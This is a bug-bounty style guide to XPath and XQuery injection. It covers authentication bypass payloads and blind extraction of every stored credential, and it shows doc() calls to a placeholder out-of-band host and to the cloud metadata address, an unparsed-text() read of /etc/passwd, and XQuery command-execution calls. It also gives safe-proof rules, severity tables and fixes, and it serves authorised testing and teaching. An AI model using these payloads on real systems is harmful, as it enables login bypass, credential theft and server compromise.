# XPath Injection — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** XPath / XQuery Injection (XML-backed auth, native XML databases, SAML, XML config lookups)
**Impact ceiling:** **Authentication bypass** · **full XML-document blind extraction** (dump every user/password) · **file read + SSRF** (XPath 2.0/3.0 `doc()`/`unparsed-text()`) · **RCE** (XQuery injection on native XML DBs).
**Primary CWE:** CWE-643 (Improper Neutralization of Data within XPath Expressions) · CWE-652 (XQuery Injection).

> ⚠️ **Advanced guide.** Get the basics first from **PortSwigger / OWASP — XPath Injection**, **OWASP Testing Guide (Testing for XPath Injection)**, **HackTricks — XPath injection**, **PayloadsAllTheThings/XPATH Injection**, and the **W3C XPath function reference**. This is the **sibling of SQLi and [../LDAP/](../LDAP/)** — same query-injection mindset, different (XML) query language. If you've done the LDAP kit, the blind-extraction engine here is the same shape.

---

## Read this first — why XPath injection still lands

> 🔰 **In plain words — the anchor for this whole kit.** An XML document is a **filing cabinet where everything is one big labeled tree** of folders. **XPath** is the query a clerk runs to find a folder — for a login it's *"is there a folder where name = X **and** password = Y?"* and your typed username is meant to be a plain word dropped into the `X` slot. **XPath injection = writing the cabinet's own query-punctuation** (`'`, `or`, `and`) into that slot, so the clerk's question turns into *"name = '' **or** '1'='1'"* — which is true for **everyone** — and the clerk hands you the **first folder in the cabinet** (usually admin). Two things make it pay: **(1)** the *whole* database is one document — one cabinet with **no per-folder locks** (unlike SQL's separate tables with permissions), so a simple yes/no answer lets you read **every folder one letter at a time**; and **(2)** the distinctive twist — **XPath 1.0 has no "comment" character**, so you can't cross out the rest of the clerk's question the way SQLi uses `--`. Instead you must leave the sentence **grammatically balanced**: your payload ends with a *dangling open-quote* that pairs with the app's own closing quote (`' or '1'='1` — count the quotes). It's the exact same mindset as SQLi and LDAP injection, just a different (XML) query language.

When an app authenticates or looks data up against an **XML document** by pasting user input into an XPath expression —
`//user[name/text()='$u' and password/text()='$p']` — an attacker who supplies `' or '1'='1` rewrites the logic to "match everything" and **logs in with no valid credentials**. And because the *entire* dataset lives in one XML document, a boolean oracle lets you walk it **node by node, character by character** and exfiltrate every username and password — there's no per-table permission model to stop you.

Why it pays **High/Critical**:
- **Auth bypass, no credentials** — the classic, unauthenticated, often lands as the first/admin user.
- **Whole-document exfiltration** — `substring()`/`string-length()`/`count()` over a boolean oracle dumps the *complete* XML store (all users, hashes, secrets). One injectable field → total data disclosure.
- **XPath 2.0/3.0 escalation** — `doc()`/`document()` → **SSRF/OOB**, `unparsed-text()` → **arbitrary file read**.
- **XQuery injection** on native XML DBs (eXist-db, BaseX, MarkLogic, Sedna) reaches **RCE** via extension functions.

**Report impact, not the quote error.** "A single quote breaks the page" is a *lead*. "I logged in as admin with no password" or "I extracted every user's password hash from the XML store" is the finding. Drive to **auth bypass, the data you dumped, the file you read, or the code you ran.**

**Core mental model.** Same as SQLi/LDAP: your input is concatenated into a query language; you **break out of the string literal** and inject **predicate logic** (`or`/`and`) or **functions** (`substring`, `count`). The twist: **XPath 1.0 has no comment syntax** — you can't `--`/`#` away the rest of the query. Instead you **balance the trailing quote** so the expression stays syntactically valid (e.g. `' or '1'='1` leaves the closing `'` to pair with the app's).

---

## Master Testing Sequence

1. **Find XPath sinks** — XML-backed login, native XML-DB queries, SAML attribute selection, XML config/`web.xml` lookups, SOAP over XML, search across an XML document.
2. **Fingerprint** — XPath **version** (1.0 vs 2.0/3.0 — governs `doc()`/`unparsed-text()`/`error()`) and the injection **context** (single- vs double-quote string, numeric, element/attribute).
3. **Detect** — quote/error probing → boolean differential (`or 1=1` vs `or 1=2`), control-baselined.
4. **Exploit** — auth bypass → blind extraction (`count`/`string-length`/`substring`) → error-based → XPath 2/3 `doc`/`unparsed-text` → XQuery RCE.
5. **Validate → severity → SAFE-PoC → report.**

---

# PART I — Find & fingerprint

## 1.1 Where XPath is used

- **XML-based authentication** — credentials stored in `users.xml`, login runs an XPath match.
- **Native XML databases** — eXist-db, BaseX, MarkLogic, Sedna, Tamino (queried with XPath/**XQuery**).
- **SAML** — some SPs select assertion attributes/NameID via XPath (injectable if built from input) — see [../OAuth/](../OAuth/).
- **XML config / catalog lookups** — product catalogs, menus, permissions in XML.
- **SOAP / XML APIs** — server selects nodes from the request/DB via XPath.
- **XSLT** — `xsl:value-of select="$userinput"` style injection (XSLT injection is a close cousin).

Grep/observe for: XML content-types, `.xml` data files, `selectNodes`/`selectSingleNode`, `XPathExpression`, `xpath.evaluate`, `//`, `document(`, `/*[`, native-XML-DB errors.

## 1.2 Fingerprint the XPath version (decides your escalation)

| Available | Version | Escalation |
|-----------|---------|-----------|
| Only `substring`, `count`, `string-length`, `contains`, `name`, `position` | **XPath 1.0** | blind extraction only (no `doc()`) |
| `doc()`, `document()`, `unparsed-text()`, `error()`, `matches()`, `lower-case()`, `string-join()` | **XPath 2.0/3.0** | + SSRF/OOB (`doc`) + file read (`unparsed-text`) |
| `let`/`for`/`return`, FLWOR, extension modules | **XQuery** (native XML DB) | + RCE (extension functions) |

Probe: does `string-length(...)` work (1.0+)? does `lower-case('A')='a'` or `matches('a','a')` evaluate (2.0+)? does a FLWOR expression parse (XQuery)?

## 1.3 Injection context

- **Single-quote string:** `...='$input'` → break with `'`.
- **Double-quote string:** `...="$input"` → break with `"`.
- **Numeric / position:** `[position()=$input]` → inject without quotes (`1 or 1=1`).
- **Element/attribute name or path fragment:** rarer; may allow `|` union or path traversal within the node tree.

---

# PART II — Detection (control-baselined)

Capture a baseline (valid input, and clearly-invalid input) first; measure the *difference*.

## 2.1 Quote / error probing

```
'          "          `          )          ]          '"          %27
' or '     " or "     (unbalanced -> XML/XPath parse error, 500, or "Invalid expression")
```
An `XPathException` / `SAXParseException` / `unterminated` / `Invalid predicate` leak confirms input reaches an XPath sink and reveals the quote context.

## 2.2 Boolean differential (the core test)

> **In plain words:** the reliable way to confirm you're really in the clerk's query (and not just crashing it) is to ask the *same* question two ways — once with a tail that's **always true** (`or '1'='1`) and once **always false** (`or '1'='2`) — and check the answers **differ**. True should give more/all records or a successful login; false should give the normal/empty result. If the two reliably differ (and it's not just an error page both times), you've proven your input steers the query's logic — that's XPath injection confirmed. Always keep a *control* (the false one) so a coincidence can't fool you.

Inject an always-true vs always-false tail and diff the response (status/length/records/login result):

```
# always TRUE (expect more/all/login-ok):
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or true() or '                 # (2.0 has true(); 1.0 use '1'='1')

# always FALSE (the control):
' or '1'='2
' and '1'='2
x' or 1=2 or 'x'='y
```
Consistent TRUE≠FALSE difference (that isn't just an error) = **XPath injection confirmed**. Try both `'` and `"` contexts.

## 2.3 The "no comments" rule

> **In plain words:** in SQL you'd type `'--` to "cross out" everything after your injection. **XPath 1.0 has no such eraser** — if you leave the clerk's question half-finished, it just errors out and nothing happens. So the trick is to make your payload *complete the sentence for them*: end it with an opening quote that has no partner, and let the app's own trailing `'` become its partner. Count the quotes in the finished line and they balance — the query stays valid *and* your `or` logic wins. That "leave a dangling quote for theirs to close" habit is the whole art of XPath payloads.

XPath 1.0 has **no comment syntax** — you cannot truncate the rest of the query. So every payload must leave the expression **syntactically balanced**. The idiom is a trailing open-string that pairs with the app's closing quote:

```
app template : //user[name='$u' and password='$p']

# CLEANEST: inject the LAST field ($p) so your `or '1'='1'` sits OUTSIDE the whole `and`:
inject $p : ' or '1'='1
result    : //user[name='$u' and password='' or '1'='1']
parses as : //user[(name='$u' and password='') or '1'='1']   <- '1'='1' is unconditionally TRUE ✓

# FIRST-field ($u) injection needs a trailing OR term to escape the `and` (see below):
inject $u : ' or 1=1 or ''='
result    : //user[name='' or 1=1 or ''='' and password='$p']
parses as : //user[name='' or 1=1 or (''='' and password='$p')]   <- the bare `or 1=1` wins → TRUE ✓
```
**Watch the precedence — this is the #1 XPath-payload mistake.** `and` binds tighter than `or` in XPath, so `name='' or '1'='1' and password='$p'` parses as `name='' or ('1'='1' and password='$p')` — which is **only** true if the password clause matches, **not** unconditionally. So a bare `' or '1'='1` injected into the **first** (name) field of an `and` predicate does **not** reliably bypass. Fix it one of three ways: inject the **last** field (your `or '1'='1'` lands after the `and`), inject the **name** field with a payload that appends its **own** trailing `or` term outside the `and` (`' or 1=1 or ''='`), or inject **both** fields (the classic OWASP example: `$u=' or '1'='1`, `$p=' or '1'='1` → `name='' or ('1'='1' and password='') or '1'='1'` → the final `or '1'='1'` is unconditionally true).

---

# PART III — Authentication bypass (the flagship)

Inject into the username and/or password field of an XML-backed login:

```
# into username — these work name-ONLY when the predicate is just name=$u
# (password checked separately/in code). If the query ANDs a password clause AFTER the
# name (name=$u AND password=$p), a bare `or '1'='1` here is NOT unconditionally true
# (precedence: name='' or ('1'='1' and password=$p)) — use a payload ending in a trailing
# OR term (like `' or 1=1 or ''='`), or inject the password field / both (see §2.3):
' or '1'='1                          # ✓ if predicate is name-only; else prefer the trailing-or forms below
admin' or '1'='1                     # target the admin node specifically (name-only predicate)
' or ''='
'or'1'='1                            # no-space variant (filter bypass)
' or 1=1 or ''='                     # ★ robust even with a trailing `and password` (bare `or 1=1` escapes the and)
"] | //user/*[position()=1] | a["    # union-based: widen the node-set (advanced)

# into both fields:
username = ' or '1'='1
password = ' or '1'='1

# double-quote context:
" or "1"="1
```

**Union (`|`) breakout** — XPath's `|` unions node-sets; injecting `']|//user|a['`-style payloads can return nodes outside the intended predicate (e.g. every `//user`), bypassing the filter and sometimes disclosing extra nodes.

→ **Impact:** authenticated session with **no valid password** → often admin → High/Critical.

---

# PART IV — Blind data extraction (the LDAP-model engine → full dump)

> **In plain words:** you can't *see* the folders, but you can ask the clerk **yes/no questions** and read the answer off the page (login worked or not, a record showed or not, the page got longer or not). That's a **boolean oracle**, and it's enough to steal everything: ask *"is the 1st letter of user #1's password 'a'? ... 'b'? ..."*, then the 2nd letter, then move to user #2 — a game of 20-questions that reconstructs the **entire cabinet** one character at a time. It's slow by hand, so `poc/xpath_blind.py` automates it (and binary-search halves the questions). Same engine as the LDAP and NoSQLi kits — if you've done those, this is muscle memory.

When you can't see data but have a **boolean oracle** (login ok/nok, record present/absent, status/length diff), reconstruct the whole XML document. This is the same char-by-char engine as [../LDAP/](../LDAP/) and [../NoSQLi/](../NoSQLi/):

## 4.1 Structure discovery
```
count(//*)                                        # total nodes
count(//user)                                     # how many user records
name(//user[1]/*[1])                              # first child element's name (2.0: local-name)
count(//user[1]/*)                                # fields per user
```
Injected as a boolean: `... or count(//user)=25 or ...` — flip the number until TRUE.

## 4.2 Length discovery
```
' or string-length((//user[1]/password))=32 or 'x'='y
```
Increment until TRUE → exact length (bounds the extraction).

## 4.3 Character-by-character
```
# does char i of the first user's password equal 'a'?  flip the char/position until TRUE:
' or substring((//user[1]/password),1,1)='a' or 'x'='y
' or substring((//user[1]/password),2,1)='b' or 'x'='y
# binary-search the codepoint for speed (fewer requests):
' or string-to-codepoints(substring((//user[1]/password),1,1))[1] > 109 or 'x'='y     # (2.0)
```
Iterate position × charset (or binary-search). Then move to `//user[2]`, `//user[3]`, … to dump **every** record. Automate with `poc/xpath_blind.py`.

## 4.4 Extract names/attributes
```
substring(name(//user[1]/*[2]),1,1)='p'          # discover element names blind
//user[1]/@id                                     # attributes
//user[position()=1]/child::node()[position()=2] # positional navigation
```

→ **Impact:** **complete disclosure** of the XML store — every credential/secret. High/Critical.

---

# PART V — Error-based & XPath 2.0/3.0 / XQuery escalation

## 5.1 Error-based extraction
Force the engine to put data into an error message (implementation-specific): e.g. cast a node-set into a context that errors and echoes its value, or trigger a type error containing the selected string. Faster than blind when errors are verbose.

## 5.2 `doc()` / `document()` → SSRF / OOB (XPath 2.0+)
> **In plain words:** newer XPath (2.0/3.0) gives the clerk a function that *fetches another document from a URL* — `doc('http://...')`. If you can inject that, you make the **server** go fetch a URL of your choosing: point it at your own listener and a hit proves the injection even when you can't see any output (a blind "phone-home"), or point it at `169.254.169.254` (the cloud metadata address) to reach internal-only services and steal cloud credentials. That's **SSRF** born from an XPath bug — hand it to the SSRF kit to cash out.

```
' or doc('http://YOUR-OOB/x')      # server-side fetch -> SSRF / blind-OOB confirmation
doc('http://169.254.169.254/latest/meta-data/')     # cloud metadata (chain ../SSRF/)
```
`doc()` makes the XML engine fetch a URL — a clean **SSRF** primitive and an **out-of-band** oracle for blind injection (exfiltrate a value into the hostname/path of a callback).

## 5.3 `unparsed-text()` → arbitrary file read (XPath 2.0+)
```
' or unparsed-text('file:///etc/passwd')
unparsed-text('file:///c:/windows/win.ini')
```
Reads a local file as text (bypasses XML well-formedness) → source/secret disclosure. Combine with the OOB oracle to exfil blind.

## 5.4 XQuery injection → RCE (native XML DBs)
> **In plain words:** some apps don't just store data in XML — they run a whole database *on* XML, using the bigger sibling language **XQuery**. Those engines ship helper ("extension") functions that can run operating-system commands — BaseX's `proc:system('id')`, eXist's `util:eval`, MarkLogic's `xdmp:*`. If your injection lands in an XQuery engine, you can pivot from "read data" to **running commands on the server (RCE)** — the top of the ceiling for this class. Match the payload to the exact engine (each has its own function names), prove it with one benign `id`, and stop.

On eXist-db / BaseX / MarkLogic / Sedna, the query language is **XQuery**, and injection can reach **extension functions** that run code:
```
# eXist-db:  util:eval / system:...  ; BaseX: proc:system('id') ; MarkLogic: xdmp:* 
'] ; import module ... ; proc:system('id') ; (: ...          # engine-specific
```
FLWOR (`for/let/where/return`) and module imports let you pivot from data theft to **command execution**. Match the payload to the specific XML DB (BaseX `proc:system`, MarkLogic `xdmp:spawn`/`xdmp:document-load`, eXist `util:eval`/`file:*`).

## 5.5 XPath injection vs XXE (don't confuse them)
- **XXE** ([../XXE/](../XXE/)) = you control the **XML input document** and inject a **DOCTYPE/entity**.
- **XPath injection** = you control a **value concatenated into the query** that runs *against* an XML document.
Different root cause, different fix — though both can reach file-read/SSRF, and a target may have both.

---

# PART VI — Escalate & chain

| You found | Do this | Severity |
|-----------|---------|----------|
| `' or '1'='1` changes login | Auth bypass → land as first/admin user | Critical/High |
| Boolean oracle on any param | `substring`/`string-length`/`count` → dump the whole XML store (all creds) | Critical/High |
| XPath 2.0 (`doc()` works) | `doc('http://oob')` → SSRF/OOB; metadata → cloud creds (→ [../SSRF/](../SSRF/)) | High/Critical |
| `unparsed-text()` works | Read `/etc/passwd`, app config, keys | High |
| Native XML DB (BaseX/MarkLogic/eXist) | XQuery extension fn → RCE | Critical |
| Verbose XPath errors | Error-based extraction (faster than blind) | High |

**Chains:** [../LDAP/](../LDAP/) & [../NoSQLi/](../NoSQLi/) (same blind engine/mindset), [../SSRF/](../SSRF/) (`doc()` metadata), [../XXE/](../XXE/) (sibling XML bug on the same endpoint), [../OAuth/](../OAuth/) (SAML XPath), auth-bypass → ATO.

---

# Real-World Case Studies (Verified)

> XPath injection is the quietest of the injection family, but its defining trait makes it *nastier* than SQLi in one specific way — and that trait, plus the XQuery escalation, is what these documented references establish. (Verify-before-write: every claim checked against primary sources, cited inline.)

**① Amit Klein, "Blind XPath Injection" (2004) — the class origin and its defining super-power.**
Amit Klein's **Watchfire whitepaper (18 May 2004)** introduced **blind XPath injection** and made the point that still defines this class: **an XML document has no access-control / privilege system**, so a successful injection lets an attacker **extract the *entire* document (database) in its completeness** — *unlike* SQL injection, where you're limited to the privileges of the DB account the app uses. His two techniques — **XPath crawling** (DFS-walk the tree) and **Booleanization** (turn any question into a true/false the app answers) — are exactly this kit's blind-extraction engine (§4). The takeaway: one injectable field on an XPath auth/search endpoint can dump **every** user and secret in the XML store.
→ *Technique:* §4 (blind boolean extraction), §2.2 (the boolean oracle). *Lesson:* no per-node ACL means one injection = the whole document, not "your account's rows."
*Source:* [Watchfire — Blind XPath Injection (Klein, 2004)](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf) · [OWASP — Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection)

**② OWASP WSTG / PortSwigger — the auth-bypass canon and why it persists.**
XPath is commonly used to **authenticate against an XML credential store** (`//user[name=$u and password=$p]`), which is exactly where a quote-balanced `' or '1'='1`-style payload turns the predicate always-true and logs you in with **no valid password** — the flagship (§3). Because XPath 1.0 has **no comment syntax**, the payloads differ from SQLi (you must keep the expression balanced, §2.3), which is *why* it slips past SQLi-tuned WAFs and hand-rolled filters. OWASP's WSTG and PortSwigger's Web Security Academy both maintain this as a current, testable class.
→ *Technique:* §3 (auth bypass), §2.3 (the no-comments rule). *Lesson:* XML-backed login + string-concatenated XPath = auth bypass; it survives because it doesn't look like SQLi.
*Source:* [OWASP WSTG — Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection) · [PortSwigger — XPath injection](https://portswigger.net/web-security/xpath-injection)

**③ XQuery injection on native XML databases — the RCE ceiling (BaseX / eXist-db / MarkLogic / Sedna).**
On native XML DBMSes, the same injection reaches **XQuery**, whose **extension modules** turn disclosure into code execution and exfiltration: **BaseX**'s Process module (`proc:system`/`proc:execute`) runs OS commands, **eXist-db**'s `util:eval` evaluates attacker XQuery and its HTTP-client/mail modules exfiltrate data (documented against the eXist REST API — send data to an external site or erase a collection), and **MarkLogic** exposes `xdmp:*` built-ins. And the Klein property holds here too: *no access-level control → retrieve the entire document*. So an XQuery-injectable native XML DB is a **Critical RCE**, not just data disclosure (§5.4).
→ *Technique:* §5.4 (XQuery → RCE), §5.2–§5.3 (`doc()` SSRF / `unparsed-text()` file read). *Lesson:* fingerprint the engine first (§1.2) — if it's a native XML DB with extension modules enabled, the ceiling is RCE.
*Source:* [Balisage — XQuery Injection (van der Vlist)](https://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html) · [BaseX — XQuery Functions / Process module](https://docs.basex.org/main/XQuery_Functions)

**④ The meta-lesson.** XPath injection is "SQLi/LDAP for XML," but with two twists that make it worth the hunt: **no access control** (Klein) means one field dumps *everything*, and **no comment syntax** means the payloads don't match SQLi signatures, so it hides where scanners and WAFs look for `--`/`#`. Fingerprint the version (§1.2) — XPath 1.0 caps at auth-bypass + full blind dump; XPath 2.0 adds `doc()` SSRF and `unparsed-text()` file read; a native XML DB adds XQuery RCE. Same injection, three very different ceilings.

---

# PART VII — Validity, false positives, severity, reporting

## 7.1 False-positive auto-reject table

| Observation | Why it's NOT (yet) a finding | What makes it real |
|-------------|------------------------------|--------------------|
| `'` throws a 500/error | Error ≠ exploitable injection | A boolean payload that **changes results** or logs you in |
| `' or '1'='1` returns 200 | 200 alone proves nothing | A **difference** vs the `' or '1'='2` control (records/login/length) |
| Login "works" once with a payload | Cached session / your own creds | Reproduce in a **fresh** session, **no** valid password, as a **different**/admin user |
| `count(//user)` reflected somewhere | Reflection ≠ execution | The count **controls the boolean** (oracle flips with the number) |
| Timing blip | Jitter | Not a timing class here — rely on boolean/content diffs |
| App uses XML | Tech ≠ vuln | An actually-injectable parameter |

**Golden rule:** an XPath-injection finding needs a **controlled, repeatable change in query behavior** — you logged in without a password, you extracted data, you read a file, or you ran code. A lone error or single odd response is a *lead*.

## 7.2 Severity calibration (CVSS + CWE)

> **In plain words:** severity tracks how far past "the clerk misbehaved" you actually got. Walking in as admin with no password (auth bypass) or dumping every credential from the cabinet is Critical/High. Running commands on an XQuery engine (RCE) is Critical. Turning `doc()` into cloud-metadata SSRF or `unparsed-text()` into a file read is High. "A quote errors" or "injection confirmed but I extracted nothing" is only a lead (Low/Medium) — report the impact you *reached*, not the crash.

| Scenario | Severity | CWE |
|----------|----------|-----|
| Auth bypass → admin, no credentials | **Critical (9–10)** | CWE-643 → CWE-287 |
| Full XML-store blind extraction (all creds) | **Critical/High** | CWE-643 |
| XQuery injection → RCE | **Critical** | CWE-652 → CWE-94/78 |
| `doc()` SSRF → cloud metadata/creds | **High/Critical** | CWE-643 → CWE-918 |
| `unparsed-text()` file read | **High** | CWE-643 |
| Partial/limited data disclosure | **Medium/High** | CWE-643 |
| Injection confirmed, no data/impact extracted | **Low/Medium** | CWE-643 |

## 7.3 SAFE-PoC discipline

- **Auth bypass:** log into a **test** account (or your own admin in a lab); on a real target prove access to the account page/`whoami`, one screenshot, **don't** roam real user data.
- **Blind extraction:** extract **your own** record / a benign marker to prove the primitive; stop after enough characters — **don't** dump every user's hash from prod.
- **`doc()`/`unparsed-text()`:** hit **your own** OOB host / read a benign file (`win.ini`, a non-secret) once to prove; **don't** exfiltrate secrets or pivot deep.
- **XQuery RCE:** one benign command (`id`/OOB) then STOP; no shells/persistence; tear down listeners.
- Throttle blind loops; don't hammer prod; redact extracted values in the report.

## 7.4 Reporting

Lead with impact + a minimal reproduction: the exact injected value (both quote contexts if relevant), the control vs injected responses, and the result (session/data/file). Use [XPATH_REPORT_TEMPLATE.md](XPATH_REPORT_TEMPLATE.md). Name the sink (`//user[name='"+input+"']` built by string concatenation) and the fix (parameterize with variable binding / `XPathVariableResolver`; validate+escape; least-privileged, non-XQuery engine).

## 7.5 References & further reading

**Core methodology**
- PortSwigger — XPath injection (blind + error-based) + Web Security Academy labs: https://portswigger.net/web-security/xpath-injection
- OWASP WSTG — Testing for XPath Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection
- HackTricks — XPath injection: https://book.hacktricks.xyz/pentesting-web/xpath-injection
- PayloadsAllTheThings — XPATH Injection (payload corpus): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
- PentesterLab — XML/XPath injection exercises: https://pentesterlab.com/
- W3C — XPath & XQuery function reference (the version/function map that decides your escalation): https://www.w3.org/TR/xpath-functions/

**Class-specific tools & research**
- **xcat** (Tom Forbes) — the reference blind-XPath extraction tool (boolean + OOB via `doc()`, file read, XPath 1.0/2.0): https://github.com/orf/xcat
- Native XML-DB **XQuery RCE** research — BaseX `proc:system`, eXist-db `util:eval`/`file:*`, MarkLogic `xdmp:*` (match the engine's extension-function catalog before firing).
- **SAML** XPath assertion/NameID-selection issues (see [../OAuth/](../OAuth/)); classic XML-authentication-bypass advisories.

**Standards**
- **CWE-643** (Improper Neutralization of Data within an XPath Expression) · **CWE-652** (Improper Neutralization of Data within an XQuery Expression): https://cwe.mitre.org/data/definitions/643.html
- **CVSS 3.1** (auth-bypass / XQuery-RCE ≈ 9–10 Critical): https://www.first.org/cvss/calculator/3.1

---

# Appendix A — Worked End-to-End Transcript (auth bypass → full-store blind dump → escalate)

> **What this shows.** The whole [Master Testing Sequence](#master-testing-sequence) in one run on a fictional XML-backed login `POST /login {user,pass}` whose query is `//user[name='$user' and password='$pass']`. It walks the two traits that *define* XPath injection: **no comment syntax** (so you balance quotes instead of truncating, §2.3) and **no access control** (so one injectable field dumps the *whole* document — Klein's 2004 insight, §Real-World ①). It ends by fingerprinting the version to pick the escalation ceiling. Benign throughout (own/test account, own OOB, redacted extraction). Authorized targets only.

**Step 1 — detect: quote-break then boolean differential (§2.1–§2.2).** Probe the `user` field; compare against a control:

```
user = x'                → 500 / XPath error         ← the quote reaches the expression (a LEAD, not a finding)
user = x' or '1'='2      → login fails (control: always-false)
user = x' or '1'='1      → behaviour CHANGES vs the control   ← boolean oracle confirmed = real XPath injection
```

> **The no-comments rule (§2.3).** SQLi would end with `-- `; XPath 1.0 has **no comment**, so the payload must leave the expression **balanced**. `name='x' or '1'='1'` closes cleanly, but note the trailing `and password='$pass'` still applies — so for a *bare* name-field bypass you often need a trailing OR that swallows the password clause (below).

**Step 2 — auth bypass: land as the first/admin user (§3).** Because `name` is ANDed with `password`, use a payload whose OR sits *outside* the whole predicate:

```
user = ' or '1'='1' or ''='            pass = anything
   → //user[name='' or '1'='1' or ''='' and password='anything']
   → the middle `'1'='1'` makes the whole predicate true regardless of password → returns the FIRST user node → logged in
# to target admin specifically:
user = ' or name='admin' or ''='       → lands as admin, no password.   AUTH BYPASS (Critical, CWE-643→CWE-287).
```

**Step 3 — the XPath super-power: blind-dump the WHOLE store (§4).** Auth bypass is Critical on its own, but the *same* oracle extracts every credential — because XML has **no per-node access control** (§Real-World ①). Booleanize `substring()`/`string-length()`:

```
# how many users?  (count() flips the oracle)
' or count(//user)=3 or ''='            → true → 3 user nodes
# length of user 1's password:
' or string-length(//user[1]/password)=32 or ''='     → true → 32 chars
# char-by-char (binary-search the codepoint for speed, ~7 requests/char):
' or substring(//user[1]/password,1,1)='5' or ''='    → false
' or substring(//user[1]/password,1,1)>'d' or ''='    → true  (bisect: >'d', <'f' ... = 'e')
   → repeat over positions 1..32 and nodes [1],[2],[3] → dump ALL usernames + password hashes/tokens
#   (SAFE-PoC §7.3: extract YOUR OWN record + a few chars of one hash to prove the primitive, redact, STOP.)
```

**Step 4 — fingerprint the version → pick the escalation ceiling (§1.2, §5).** How far it goes depends entirely on the engine:

```
' or doc('http://YOUR.oob/x')  ...      → OOB hit? = XPath 2.0+  → doc('http://169.254.169.254/...') = SSRF→cloud creds (§5.2)
' or unparsed-text('/etc/passwd') ...    → works? = arbitrary FILE READ (§5.3)
# native XML DB (BaseX/eXist/MarkLogic)? → XQuery injection → RCE:
   BaseX:  proc:system('id')      eXist: util:eval(...)      MarkLogic: xdmp:*        (§5.4, §Real-World ③)
```

**Step 5 — report the impact (§7.4).** Lead with what you reached, show the control:

```
Title:  XPath injection in login `user` → authentication bypass + full credential-store disclosure
Proof:  ' or '1'='2 (control) vs ' or '1'='1' or ''=' (login succeeds, no password) = boolean oracle →
        ' or name='admin' or ''=' = admin session → substring()/string-length() dumped all //user nodes (redacted).
Impact: auth bypass to admin AND blind extraction of every credential in the XML store (Critical, CWE-643→CWE-287).
        [If XPath 2.0: + doc() SSRF / unparsed-text() file read. If native XML DB: + XQuery RCE, CWE-652.]
Fix:    parameterize XPath (variable binding / XPathVariableResolver), never concatenate; allow-list usernames
        (^[A-Za-z0-9_]+$); compare password hashes in code; disable doc()/unparsed-text()/extension modules.
Notes:  benign proof only — own/test account, own OOB, extraction redacted, throttled; no prod dump.
```

That is a full XPath run: **§2 detect → §3 auth bypass → §4 blind full-store dump → §1.2/§5 version-gated escalation → §7 report.** One injectable login field became admin access *and* the whole credential store — because XML has no access control (Klein, 2004) and no comments to give the payload away.

---

## Companion files
- **[XPATH_ARSENAL.md](XPATH_ARSENAL.md)** — payloads + functions + tools.
- **[XPATH_CHECKLIST.md](XPATH_CHECKLIST.md)** — phase-by-phase + auto-reject.
- **[XPATH_REPORT_TEMPLATE.md](XPATH_REPORT_TEMPLATE.md)** — report skeleton.
- **[XPath_Zero_to_Expert.md](XPath_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `xpath_fuzz.py` (detect + auth-bypass, control-baselined) · `xpath_blind.py` (count/length/substring char-by-char) · `xcat_cheat.md`.
